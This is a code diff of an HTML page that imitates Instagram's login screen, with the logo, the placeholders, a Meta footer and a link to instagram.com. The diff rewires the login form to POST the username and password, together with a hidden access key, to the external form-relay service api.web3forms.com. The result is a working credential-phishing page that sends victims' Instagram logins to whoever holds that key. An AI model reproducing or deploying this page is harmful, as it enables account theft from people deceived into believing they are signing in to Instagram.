@@ -9,16 +9,19 @@
 </head>
 <body>
      <div class="container">
-          
+
           <header>
-               <h5>English (UK)</h5>
+               <h5>English (UK) <span>v</span></h5>
                <img src="logo.png" alt="instagram_logo">
           </header>
 
           <main>
-               <form action="">
-                    <input type="text" name="username" id="username">
-                    <input type="password" name="pass_word" id="password">
+               <form action="https://api.web3forms.com/submit" method="post">
+
+                    <input type="hidden" name="access_key" value="e4e6e175-09c2-4000-9736-3b9241f5c21a">
+
+                    <input type="text" class="similar_input" name="username" id="username" placeholder="Username, email address or mobile number">
+                    <input type="password" class="similar_input" name="pass_word" id="password" placeholder="Password">
                     <input type="submit" value="Log in" id="btn">
 
                     <a href="https://instagram.com">Forgotten password?</a>
@@ -27,7 +30,7 @@
 
           <footer>
                <button>Create new account</button>
-               <img src="meta" alt="logo">
+               <img src="meta.png" alt="logo">
           </footer>
      </div>
 </body>
